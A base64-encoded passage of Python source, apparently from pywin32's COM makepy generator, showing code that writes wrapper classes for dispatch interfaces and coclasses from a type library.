ICAgICAgcHl0aG9uY29tLkRJU1BBVENIX1BST1BFUlRZUFVULFxuICAgICAgICAgICAgICAgICAgICAgICAgZGVmQXJnRGVzYyxcbiAgICAgICAgICAgICAgICAgICAgKSxcbiAgICAgICAgICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICAgICAgKVxuXG4gICAgICAgIG5hbWVzID0gbGlzdChzZWxmLnByb3BNYXBQdXQua2V5cygpKVxuICAgICAgICBuYW1lcy5zb3J0KClcbiAgICAgICAgZm9yIGtleSBpbiBuYW1lczpcbiAgICAgICAgICAgIGVudHJ5ID0gc2VsZi5wcm9wTWFwUHV0W2tleV1cbiAgICAgICAgICAgIGlmIGdlbmVyYXRvci5iQnVpbGRIaWRkZW4gb3Igbm90IGVudHJ5LmhpZGRlbjpcbiAgICAgICAgICAgICAgICBkZXRhaWxzID0gZW50cnkuZGVzY1xuICAgICAgICAgICAgICAgIGRlZkFyZ0Rlc2MgPSBNYWtlRGVmYXVsdEFyZ3NGb3JQcm9wZXJ0eVB1dChkZXRhaWxzWzJdKVxuICAgICAgICAgICAgICAgIHByaW50KFxuICAgICAgICAgICAgICAgICAgICBcJ1xcdFxcdCIlcyI6ICgoJXMsIExDSUQsICVkLCAwKSwlcyksXCdcbiAgICAgICAgICAgICAgICAgICAgJSAoXG4gICAgICAgICAgICAgICAgICAgICAgICBidWlsZC5NYWtlUHVibGljQXR0cmlidXRlTmFtZShrZXkpLFxuICAgICAgICAgICAgICAgICAgICAgICAgZGV0YWlsc1swXSxcbiAgICAgICAgICAgICAgICAgICAgICAgIGRldGFpbHNbNF0sXG4gICAgICAgICAgICAgICAgICAgICAgICBkZWZBcmdEZXNjLFxuICAgICAgICAgICAgICAgICAgICApLFxuICAgICAgICAgICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgICAgICAgICApXG4gICAgICAgIHByaW50KCJcXHR9IiwgZmlsZT1zdHJlYW0pXG5cbiAgICAgICAgaWYgc3BlY2lhbEl0ZW1zWyJ2YWx1ZSJdOlxuICAgICAgICAgICAgZW50cnksIGludm9rZXR5cGUsIHByb3BBcmdzID0gc3BlY2lhbEl0ZW1zWyJ2YWx1ZSJdXG4gICAgICAgICAgICBpZiBwcm9wQXJncyBpcyBOb25lOlxuICAgICAgICAgICAgICAgIHR5cGVuYW1lID0gIm1ldGhvZCJcbiAgICAgICAgICAgICAgICByZXQgPSBzZWxmLk1ha2VGdW5jTWV0aG9kKGVudHJ5LCAiX19jYWxsX18iKVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICB0eXBlbmFtZSA9ICJwcm9wZXJ0eSJcbiAgICAgICAgICAgICAgICByZXQgPSBbXG4gICAgICAgICAgICAgICAgICAgICJcXHRkZWYgX19jYWxsX18oc2VsZik6XFxuXFx0XFx0cmV0dXJuIHNlbGYuX0FwcGx5VHlwZXNfKColcykiXG4gICAgICAgICAgICAgICAgICAgICUgcHJvcEFyZ3NcbiAgICAgICAgICAgICAgICBdXG4gICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAiXFx0IyBEZWZhdWx0ICVzIGZvciB0aGlzIGNsYXNzIGlzIFwnJXNcJyIgJSAodHlwZW5hbWUsIGVudHJ5Lm5hbWVzWzBdKSxcbiAgICAgICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgICAgIClcbiAgICAgICAgICAgIGZvciBsaW5lIGluIHJldDpcbiAgICAgICAgICAgICAgICBwcmludChsaW5lLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgICAgIHByaW50KCJcXHRkZWYgX19zdHJfXyhzZWxmLCAqYXJncyk6IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBwcmludCgiXFx0XFx0cmV0dXJuIHN0cihzZWxmLl9fY2FsbF9fKCphcmdzKSkiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgICAgIHByaW50KCJcXHRkZWYgX19pbnRfXyhzZWxmLCAqYXJncyk6IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICBwcmludCgiXFx0XFx0cmV0dXJuIGludChzZWxmLl9fY2FsbF9fKCphcmdzKSkiLCBmaWxlPXN0cmVhbSlcblxuICAgICAgICAjIF9OZXdFbnVtIChESVNQSURfTkVXRU5VTSkgZG9lcyBub3QgYXBwZWFyIGluIHR5cGVsaWIgZm9yIG1hbnkgb2ZmaWNlIG9iamVjdHMsXG4gICAgICAgICMgYnV0IGl0IGNhbiBzdGlsbCBiZSByZXRyaWV2ZWQgYXQgcnVudGltZSwgc28gIGFsd2F5cyBjcmVhdGUgX19pdGVyX18uXG4gICAgICAgICMgQWxzbywgc29tZSBvZiB0aG9zZSBzYW1lIG9iamVjdHMgdXNlIDEtYmFzZWQgaW5kZXhpbmcsIGNhdXNpbmcgdGhlIG9sZC1zdHlsZVxuICAgICAgICAjIF9fZ2V0aXRlbV9fIGl0ZXJhdGlvbiB0byBmYWlsIGZvciBpbmRleCAwIHdoZXJlIHRoZSBkeW5hbWljIGl0ZXJhdGlvbiBzdWNjZWVkcy5cbiAgICAgICAgaWYgc3BlY2lhbEl0ZW1zWyJfbmV3ZW51bSJdOlxuICAgICAgICAgICAgZW51bUVudHJ5LCBpbnZva2V0eXBlLCBwcm9wQXJncyA9IHNwZWNpYWxJdGVtc1siX25ld2VudW0iXVxuICAgICAgICAgICAgYXNzZXJ0IGVudW1FbnRyeS5kZXNjLmRlc2NraW5kID09IHB5dGhvbmNvbS5ERVNDS0lORF9GVU5DREVTQ1xuICAgICAgICAgICAgaW52a2luZCA9IGVudW1FbnRyeS5kZXNjLmludmtpbmRcbiAgICAgICAgICAgICMgPz8/IFdvdWxkblwndCB0aGlzIGJlIHRoZSByZXN1bHRDTFNJRCBmb3IgdGhlIGl0ZXJhdG9yIGl0c2VsZiwgcmF0aGVyIHRoYW4gdGhlIHJlc3VsdENMU0lEXG4gICAgICAgICAgICAjICBmb3IgdGhlIHJlc3VsdCBvZiBlYWNoIE5leHQoKSBjYWxsLCB3aGljaCBpcyB3aGF0IGl0XCdzIHVzZWQgZm9yID8/P1xuICAgICAgICAgICAgcmVzdWx0Q0xTSUQgPSBlbnVtRW50cnkuR2V0UmVzdWx0Q0xTSURTdHIoKVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgaW52a2luZCA9IHB5dGhvbmNvbS5ESVNQQVRDSF9NRVRIT0QgfCBweXRob25jb20uRElTUEFUQ0hfUFJPUEVSVFlHRVRcbiAgICAgICAgICAgIHJlc3VsdENMU0lEID0gIk5vbmUiXG4gICAgICAgICMgSWYgd2UgZG9udCBoYXZlIGEgZ29vZCBDTFNJRCBmb3IgdGhlIGVudW0gcmVzdWx0LCBhc3N1bWUgaXQgaXMgdGhlIHNhbWUgYXMgdGhlIEl0ZW0oKSBtZXRob2QuXG4gICAgICAgIGlmIHJlc3VsdENMU0lEID09ICJOb25lIiBhbmQgIkl0ZW0iIGluIHNlbGYubWFwRnVuY3M6XG4gICAgICAgICAgICByZXN1bHRDTFNJRCA9IHNlbGYubWFwRnVuY3NbIkl0ZW0iXS5HZXRSZXN1bHRDTFNJRFN0cigpXG4gICAgICAgIHByaW50KCJcXHRkZWYgX19pdGVyX18oc2VsZik6IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgIHByaW50KFwnXFx0XFx0IlJldHVybiBhIFB5dGhvbiBpdGVyYXRvciBmb3IgdGhpcyBvYmplY3QiXCcsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludCgiXFx0XFx0dHJ5OiIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludChcbiAgICAgICAgICAgICJcXHRcXHRcXHRvYiA9IHNlbGYuX29sZW9ial8uSW52b2tlVHlwZXMoJWQsTENJRCwlZCwoMTMsIDEwKSwoKSkiXG4gICAgICAgICAgICAlIChweXRob25jb20uRElTUElEX05FV0VOVU0sIGludmtpbmQpLFxuICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgIClcbiAgICAgICAgcHJpbnQoIlxcdFxcdGV4Y2VwdCBweXRob25jb20uZXJyb3I6IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgIHByaW50KFxuICAgICAgICAgICAgXCdcXHRcXHRcXHRyYWlzZSBUeXBlRXJyb3IoIlRoaXMgb2JqZWN0IGRvZXMgbm90IHN1cHBvcnQgZW51bWVyYXRpb24iKVwnLFxuICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgIClcbiAgICAgICAgIyBJdGVyYXRvciBpcyB3cmFwcGVkIGFzIFB5SUVudW1WYXJpYW50LCBhbmQgZWFjaCByZXN1bHQgb2YgX19uZXh0X18gaXMgRGlzcGF0Y2hcJ2VkIGlmIG5lY2Vzc2FyeVxuICAgICAgICBwcmludChcbiAgICAgICAgICAgICJcXHRcXHRyZXR1cm4gd2luMzJjb20uY2xpZW50LnV0aWwuSXRlcmF0b3Iob2IsICVzKSIgJSByZXN1bHRDTFNJRCxcbiAgICAgICAgICAgIGZpbGU9c3RyZWFtLFxuICAgICAgICApXG5cbiAgICAgICAgaWYgc3BlY2lhbEl0ZW1zWyJpdGVtIl06XG4gICAgICAgICAgICBlbnRyeSwgaW52b2tldHlwZSwgcHJvcEFyZ3MgPSBzcGVjaWFsSXRlbXNbIml0ZW0iXVxuICAgICAgICAgICAgcmVzdWx0Q0xTSUQgPSBlbnRyeS5HZXRSZXN1bHRDTFNJRFN0cigpXG4gICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAiXFx0I1RoaXMgY2xhc3MgaGFzIEl0ZW0gcHJvcGVydHkvbWV0aG9kIHdoaWNoIGFsbG93cyBpbmRleGVkIGFjY2VzcyB3aXRoIHRoZSBvYmplY3Rba2V5XSBzeW50YXguIixcbiAgICAgICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgICAgIClcbiAgICAgICAgICAgIHByaW50KFxuICAgICAgICAgICAgICAgICJcXHQjU29tZSBvYmplY3RzIHdpbGwgYWNjZXB0IGEgc3RyaW5nIG9yIG90aGVyIHR5cGUgb2Yga2V5IGluIGFkZGl0aW9uIHRvIGludGVnZXJzLiIsXG4gICAgICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICApXG4gICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAiXFx0I05vdGUgdGhhdCBtYW55IE9mZmljZSBvYmplY3RzIGRvIG5vdCB1c2UgemVyby1iYXNlZCBpbmRleGluZy4iLFxuICAgICAgICAgICAgICAgIGZpbGU9c3RyZWFtLFxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgcHJpbnQoIlxcdGRlZiBfX2dldGl0ZW1fXyhzZWxmLCBrZXkpOiIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgXCdcXHRcXHRyZXR1cm4gc2VsZi5fZ2V0X2dvb2Rfb2JqZWN0XyhzZWxmLl9vbGVvYmpfLkludm9rZSgqKCVkLCBMQ0lELCAlZCwgMSwga2V5KSksICJJdGVtIiwgJXMpXCdcbiAgICAgICAgICAgICAgICAlIChlbnRyeS5kZXNjLm1lbWlkLCBpbnZva2V0eXBlLCByZXN1bHRDTFNJRCksXG4gICAgICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICApXG5cbiAgICAgICAgaWYgc3BlY2lhbEl0ZW1zWyJjb3VudCJdOlxuICAgICAgICAgICAgZW50cnksIGludm9rZXR5cGUsIHByb3BBcmdzID0gc3BlY2lhbEl0ZW1zWyJjb3VudCJdXG4gICAgICAgICAgICBpZiBwcm9wQXJncyBpcyBOb25lOlxuICAgICAgICAgICAgICAgIHR5cGVuYW1lID0gIm1ldGhvZCJcbiAgICAgICAgICAgICAgICByZXQgPSBzZWxmLk1ha2VGdW5jTWV0aG9kKGVudHJ5LCAiX19sZW5fXyIpXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIHR5cGVuYW1lID0gInByb3BlcnR5IlxuICAgICAgICAgICAgICAgIHJldCA9IFtcbiAgICAgICAgICAgICAgICAgICAgIlxcdGRlZiBfX2xlbl9fKHNlbGYpOlxcblxcdFxcdHJldHVybiBzZWxmLl9BcHBseVR5cGVzXygqJXMpIiAlIHByb3BBcmdzXG4gICAgICAgICAgICAgICAgXVxuICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgIlxcdCNUaGlzIGNsYXNzIGhhcyBDb3VudCgpICVzIC0gYWxsb3cgbGVuKG9iKSB0byBwcm92aWRlIHRoaXMiXG4gICAgICAgICAgICAgICAgJSAodHlwZW5hbWUpLFxuICAgICAgICAgICAgICAgIGZpbGU9c3RyZWFtLFxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgZm9yIGxpbmUgaW4gcmV0OlxuICAgICAgICAgICAgICAgIHByaW50KGxpbmUsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgIyBBbHNvIGluY2x1ZGUgYSBfX25vbnplcm9fX1xuICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgIlxcdCNUaGlzIGNsYXNzIGhhcyBhIF9fbGVuX18gLSB0aGlzIGlzIG5lZWRlZCBzbyBcJ2lmIG9iamVjdDpcJyBhbHdheXMgcmV0dXJucyBUUlVFLiIsXG4gICAgICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICApXG4gICAgICAgICAgICBwcmludCgiXFx0ZGVmIF9fbm9uemVyb19fKHNlbGYpOiIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQoIlxcdFxcdHJldHVybiBUcnVlIiwgZmlsZT1zdHJlYW0pXG5cblxuY2xhc3MgQ29DbGFzc0l0ZW0oYnVpbGQuT2xlSXRlbSwgV3JpdGFibGVJdGVtKTpcbiAgICBvcmRlciA9IDVcbiAgICB0eXBlbmFtZSA9ICJDT0NMQVNTIlxuXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHR5cGVpbmZvLCBhdHRyLCBkb2M9Tm9uZSwgc291cmNlcz1bXSwgaW50ZXJmYWNlcz1bXSwgYkZvclVzZXI9MSk6XG4gICAgICAgIGJ1aWxkLk9sZUl0ZW0uX19pbml0X18oc2VsZiwgZG9jKVxuICAgICAgICBzZWxmLmNsc2lkID0gYXR0clswXVxuICAgICAgICBzZWxmLnNvdXJjZXMgPSBzb3VyY2VzXG4gICAgICAgIHNlbGYuaW50ZXJmYWNlcyA9IGludGVyZmFjZXNcbiAgICAgICAgc2VsZi5iSXNEaXNwYXRjaCA9IDEgICMgUHJldGVuZCBpdCBpcyBzbyBpdCBpcyB3cml0dGVuIHRvIHRoZSBjbGFzcyBtYXAuXG5cbiAgICBkZWYgV3JpdGVDbGFzcyhzZWxmLCBnZW5lcmF0b3IpOlxuICAgICAgICBnZW5lcmF0b3IuY2hlY2tXcml0ZUNvQ2xhc3NCYXNlQ2xhc3MoKVxuICAgICAgICBkb2MgPSBzZWxmLmRvY1xuICAgICAgICBzdHJlYW0gPSBnZW5lcmF0b3IuZmlsZVxuICAgICAgICBpZiBnZW5lcmF0b3IuZ2VuZXJhdGVfdHlwZSA9PSBHRU5fREVNQU5EX0NISUxEOlxuICAgICAgICAgICAgIyBTb21lIHNwZWNpYWwgaW1wb3J0cyB3ZSBtdXN0IHNldHVwLlxuICAgICAgICAgICAgcmVmZXJlbmNlZF9pdGVtcyA9IFtdXG4gICAgICAgICAgICBmb3IgcmVmLCBmbGFnIGluIHNlbGYuc291cmNlczpcbiAgICAgICAgICAgICAgICByZWZlcmVuY2VkX2l0ZW1zLmFwcGVuZChyZWYpXG4gICAgICAgICAgICBmb3IgcmVmLCBmbGFnIGluIHNlbGYuaW50ZXJmYWNlczpcbiAgICAgICAgICAgICAgICByZWZlcmVuY2VkX2l0ZW1zLmFwcGVuZChyZWYpXG4gICAgICAgICAgICBwcmludCgiaW1wb3J0IHN5cyIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgZm9yIHJlZiBpbiByZWZlcmVuY2VkX2l0ZW1zOlxuICAgICAgICAgICAgICAgIHByaW50KFxuICAgICAgICAgICAgICAgICAgICAiX19pbXBvcnRfXyhcJyVzLiVzXCcpIiAlIChnZW5lcmF0b3IuYmFzZV9tb2RfbmFtZSwgcmVmLnB5dGhvbl9uYW1lKSxcbiAgICAgICAgICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgIHByaW50KFxuICAgICAgICAgICAgICAgICAgICAiJXMgPSBzeXMubW9kdWxlc1tcJyVzLiVzXCddLiVzIlxuICAgICAgICAgICAgICAgICAgICAlIChcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlZi5weXRob25fbmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgIGdlbmVyYXRvci5iYXNlX21vZF9uYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmLnB5dGhvbl9uYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmLnB5dGhvbl9uYW1lLFxuICAgICAgICAgICAgICAgICAgICApLFxuICAgICAgICAgICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgIyBBbmQgcHJldGVuZCB3ZSBoYXZlIHdyaXR0ZW4gaXQgLSB0aGUgbmFtZSBpcyBub3cgYXZhaWxhYmxlIGFzIGlmIHdlIGhhZCFcbiAgICAgICAgICAgICAgICByZWYuYldyaXR0ZW4gPSAxXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIHByb2dJZCA9IHB5dGhvbmNvbS5Qcm9nSURGcm9tQ0xTSUQoc2VsZi5jbHNpZClcbiAgICAgICAgICAgIHByaW50KCIjIFRoaXMgQ29DbGFzcyBpcyBrbm93biBieSB0aGUgbmFtZSBcJyVzXCciICUgKHByb2dJZCksIGZpbGU9c3RyZWFtKVxuICAgICAgICBleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvcjpcbiAgICAgICAgICAgIHBhc3NcbiAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAiY2xhc3MgJXMoQ29DbGFzc0Jhc2VDbGFzcyk6ICMgQSBDb0NsYXNzIiAlIChzZWxmLnB5dGhvbl9uYW1lKSwgZmlsZT1zdHJlYW1cbiAgICAgICAgKVxuICAgICAgICBpZiBkb2MgYW5kIGRvY1sxXTpcbiAgICAgICAgICAgIHByaW50KCJcXHQjICIgKyBkb2NbMV0sIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludCgiXFx0Q0xTSUQgPSAlciIgJSAoc2VsZi5jbHNpZCwpLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoIlxcdGNvY2xhc3Nfc291cmNlcyA9IFsiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgZGVmSXRlbSA9IE5vbmVcbiAgICAgICAgZm9yIGl0ZW0sIGZsYWcgaW4gc2VsZi5zb3VyY2VzOlxuICAgICAgICAgICAgaWYgZmxhZyAmIHB5dGhvbmNvbS5JTVBMVFlQRUZMQUdfRkRFRkFVTFQ6XG4gICAgICAgICAgICAgICAgZGVmSXRlbSA9IGl0ZW1cbiAgICAgICAgICAgICMgSWYgd2UgaGF2ZSB3cml0dGVuIGEgUHl0aG9uIGNsYXNzLCByZWZlcmVuY2UgdGhlIG5hbWUgLVxuICAgICAgICAgICAgIyBvdGhlcndpc2UganVzdCB0aGUgSUlELlxuICAgICAgICAgICAgaWYgaXRlbS5iV3JpdHRlbjpcbiAgICAgICAgICAgICAgICBrZXkgPSBpdGVtLnB5dGhvbl9uYW1lXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGtleSA9IHJlcHIoc3RyKGl0ZW0uY2xzaWQpKSAgIyByZWFsbHkgdGhlIGlpZC5cbiAgICAgICAgICAgIHByaW50KCJcXHRcXHQlcywiICUgKGtleSksIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludCgiXFx0XSIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBpZiBkZWZJdGVtOlxuICAgICAgICAgICAgaWYgZGVmSXRlbS5iV3JpdHRlbjpcbiAgICAgICAgICAgICAgICBkZWZOYW1lID0gZGVmSXRlbS5weXRob25fbmFtZVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBkZWZOYW1lID0gcmVwcihzdHIoZGVmSXRlbS5jbHNpZCkpICAjIHJlYWxseSB0aGUgaWlkLlxuICAgICAgICAgICAgcHJpbnQoIlxcdGRlZmF1bHRfc291cmNlID0gJXMiICUgKGRlZk5hbWUsKSwgZmlsZT1zdHJlYW0pXG4gICAgICAgIHByaW50KCJcXHRjb2NsYXNzX2ludGVyZmFjZXMgPSBbIiwgZmlsZT1zdHJlYW0pXG4gICAgICAgIGRlZkl0ZW0gPSBOb25lXG4gICAgICAgIGZvciBpdGVtLCBmbGFnIGluIHNlbGYuaW50ZXJmYWNlczpcbiAgICAgICAgICAgIGlmIGZsYWcgJiBweXRob25jb20uSU1QTFRZUEVGTEFHX0ZERUZBVUxUOiAgIyBhbmQgZHVhbDpcbiAgICAgICAgICAgICAgICBkZWZJdGVtID0gaXRlbVxuICAgICAgICAgICAgIyBJZiB3ZSBoYXZlIHdyaXR0ZW4gYSBjbGFzcywgcmVmZXJlbmNlIGl0cyBuYW1lLCBvdGhlcndpc2UgdGhlIElJRFxuICAgICAgICAgICAgaWYgaXRlbS5iV3JpdHRlbjpcbiAgICAgICAgICAgICAgICBrZXkgPSBpdGVtLnB5dGhvbl9uYW1lXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGtleSA9IHJlcHIoc3RyKGl0ZW0uY2xzaWQpKSAgIyByZWFsbHkgdGhlIGlpZC5cbiAgICAgICAgICAgIHByaW50KCJcXHRcXHQlcywiICUgKGtleSwpLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoIlxcdF0iLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgaWYgZGVmSXRlbTpcbiAgICAgICAgICAgIGlmIGRlZkl0ZW0uYldyaXR0ZW46XG4gICAgICAgICAgICAgICAgZGVmTmFtZSA9IGRlZkl0ZW0ucHl0aG9uX25hbWVcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgZGVmTmFtZSA9IHJlcHIoc3RyKGRlZkl0ZW0uY2xzaWQpKSAgIyByZWFsbHkgdGhlIGlpZC5cbiAgICAgICAgICAgIHByaW50KCJcXHRkZWZhdWx0X2ludGVyZmFjZSA9ICVzIiAlIChkZWZOYW1lLCksIGZpbGU9c3RyZWFtKVxuICAgICAgICBzZWxmLmJXcml0dGVuID0gMVxuICAgICAgICBwcmludChmaWxlPXN0cmVhbSlcblxuXG5jbGFzcyBHZW5lcmF0b3JQcm9ncmVzczpcbiAgICBkZWYgX19pbml0X18oc2VsZik6XG4gICAgICAgIHBhc3NcblxuICAgIGRlZiBTdGFydGluZyhzZWxmLCB0bGJfZGVzYyk6XG4gICAgICAgICIiIkNhbGxlZCB3aGVuIHRoZSBwcm9jZXNzIHN0YXJ0cy4iIiJcbiAgICAgICAgc2VsZi50bGJfZGVzYyA9IHRsYl9kZXNjXG5cbiAgICBkZWYgRmluaXNoZWQoc2VsZik6XG4gICAgICAgICIiIkNhbGxlZCB3aGVuIHRoZSBwcm9jZXNzIGlzIGNvbXBsZXRlLiIiIlxuXG4gICAgZGVmIFNldERlc2NyaXB0aW9uKHNlbGYsIGRlc2MsIG1heHRpY2tzPU5vbmUpOlxuICAgICAgICAiIiJXZSBhcmUgZW50ZXJpbmcgYSBtYWpvciBzdGVwLiAgSWYgbWF4dGlja3MsIHRoZW4gdGhpc1xuICAgICAgICBpcyBob3cgbWFueSB0aWNrcyB3ZSBleHBlY3QgdG8gbWFrZSB1bnRpbCBmaW5pc2hlZFxuICAgICAgICAiIiJcblxuICAgIGRlZiBUaWNrKHNlbGYsIGRlc2M9Tm9uZSk6XG4gICAgICAgICIiIk1pbm9yIHByb2dyZXNzIHN0ZXAuICBDYW4gcHJvdmlkZSBuZXcgZGVzY3JpcHRpb24gaWYgbmVjZXNzYXJ5IiIiXG5cbiAgICBkZWYgVmVyYm9zZVByb2dyZXNzKHNlbGYsIGRlc2MpOlxuICAgICAgICAiIiJWZXJib3NlL0RlYnVnZ2luZyBvdXRwdXQuIiIiXG5cbiAgICBkZWYgTG9nV2FybmluZyhzZWxmLCBkZXNjKTpcbiAgICAgICAgIiIiSWYgYSB3YXJuaW5nIGlzIGdlbmVyYXRlZCIiIlxuXG4gICAgZGVmIExvZ0JlZ2luR2VuZXJhdGUoc2VsZiwgZmlsZW5hbWUpOlxuICAgICAgICBwYXNzXG5cbiAgICBkZWYgQ2xvc2Uoc2VsZik6XG4gICAgICAgIHBhc3NcblxuXG5jbGFzcyBHZW5lcmF0b3I6XG4gICAgZGVmIF9faW5pdF9fKFxuICAgICAgICBzZWxmLFxuICAgICAgICB0eXBlbGliLFxuICAgICAgICBzb3VyY2VGaWxlbmFtZSxcbiAgICAgICAgcHJvZ3Jlc3NPYmplY3QsXG4gICAgICAgIGJCdWlsZEhpZGRlbj0xLFxuICAgICAgICBiVW5pY29kZVRvU3RyaW5nPU5vbmUsXG4gICAgKTpcbiAgICAgICAgYXNzZXJ0IGJVbmljb2RlVG9TdHJpbmcgaXMgTm9uZSwgInRoaXMgaXMgZGVwcmVjYXRlZCBhbmQgd2lsbCBnbyBhd2F5IlxuICAgICAgICBzZWxmLmJIYXZlV3JpdHRlbkRpc3BhdGNoQmFzZUNsYXNzID0gMFxuICAgICAgICBzZWxmLmJIYXZlV3JpdHRlbkNvQ2xhc3NCYXNlQ2xhc3MgPSAwXG4gICAgICAgIHNlbGYuYkhhdmVXcml0dGVuRXZlbnRCYXNlQ2xhc3MgPSAwXG4gICAgICAgIHNlbGYudHlwZWxpYiA9IHR5cGVsaWJcbiAgICAgICAgc2VsZi5zb3VyY2VGaWxlbmFtZSA9IHNvdXJjZUZpbGVuYW1lXG4gICAgICAgIHNlbGYuYkJ1aWxkSGlkZGVuID0gYkJ1aWxkSGlkZGVuXG4gICAgICAgIHNlbGYucHJvZ3Jlc3MgPSBwcm9ncmVzc09iamVjdFxuICAgICAgICAjIFRoZXNlIDIgYXJlIGxhdGVyIGFkZGl0aW9ucyBhbmQgbW9zdCBvZiB0aGUgY29kZSBzdGlsbCBcJ3ByaW50XCdzLi4uXG4gICAgICAgIHNlbGYuZmlsZSA9IE5vbmVcblxuICAgIGRlZiBDb2xsZWN0T2xlSXRlbUluZm9zRnJvbVR5cGUoc2VsZik6XG4gICAgICAgIHJldCA9IFtdXG4gICAgICAgIGZvciBpIGluIHJhbmdlKHNlbGYudHlwZWxpYi5HZXRUeXBlSW5mb0NvdW50KCkpOlxuICAgICAgICAgICAgaW5mbyA9IHNlbGYudHlwZWxpYi5HZXRUeXBlSW5mbyhpKVxuICAgICAgICAgICAgaW5mb3R5cGUgPSBzZWxmLnR5cGVsaWIuR2V0VHlwZUluZm9UeXBlKGkpXG4gICAgICAgICAgICBkb2MgPSBzZWxmLnR5cGVsaWIuR2V0RG9jdW1lbnRhdGlvbihpKVxuICAgICAgICAgICAgYXR0ciA9IGluZm8uR2V0VHlwZUF0dHIoKVxuICAgICAgICAgICAgcmV0LmFwcGVuZCgoaW5mbywgaW5mb3R5cGUsIGRvYywgYXR0cikpXG4gICAgICAgIHJldHVybiByZXRcblxuICAgIGRlZiBfQnVpbGRfQ29DbGFzcyhzZWxmLCB0eXBlX2luZm9fdHVwbGUpOlxuICAgICAgICBpbmZvLCBpbmZvdHlwZSwgZG9jLCBhdHRyID0gdHlwZV9pbmZvX3R1cGxlXG4gICAgICAgICMgZmluZCB0aGUgc291cmNlIGFuZCBkaXNwaW50ZXJmYWNlcyBmb3IgdGhlIGNvY2xhc3NcbiAgICAgICAgY2hpbGRfaW5mb3MgPSBbXVxuICAgICAgICBmb3IgaiBpbiByYW5nZShhdHRyWzhdKTpcbiAgICAgICAgICAgIGZsYWdzID0gaW5mby5HZXRJbXBsVHlwZUZsYWdzKGopXG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgcmVmVHlwZSA9IGluZm8uR2V0UmVmVHlwZUluZm8oaW5mby5HZXRSZWZUeXBlT2ZJbXBsVHlwZShqKSlcbiAgICAgICAgICAgIGV4Y2VwdCBweXRob25jb20uY29tX2Vycm9yOlxuICAgICAgICAgICAgICAgICMgQ2FuXCd0IGxvYWQgYSBkZXBlbmRlbnQgdHlwZWxpYj9cbiAgICAgICAgICAgICAgICBjb250aW51ZVxuICAgICAgICAgICAgcmVmQXR0ciA9IHJlZlR5cGUuR2V0VHlwZUF0dHIoKVxuICAgICAgICAgICAgY2hpbGRfaW5mb3MuYXBwZW5kKFxuICAgICAgICAgICAgICAgIChcbiAgICAgICAgICAgICAgICAgICAgaW5mbyxcbiAgICAgICAgICAgICAgICAgICAgcmVmQXR0ci50eXBla2luZCxcbiAgICAgICAgICAgICAgICAgICAgcmVmVHlwZSxcbiAgICAgICAgICAgICAgICAgICAgcmVmVHlwZS5HZXREb2N1bWVudGF0aW9uKC0xKSxcbiAgICAgICAgICAgICAgICAgICAgcmVmQXR0cixcbiAgICAgICAgICAgICAgICAgICAgZmxhZ3MsXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgKVxuXG4gICAgICAgICMgRG9uZSBnZW5lcmF0aW5nIGNoaWxkcmVuIC0gbm93IHRoZSBDb0NsYXNzIGl0c2VsZi5cbiAgICAgICAgbmV3SXRlbSA9IENvQ2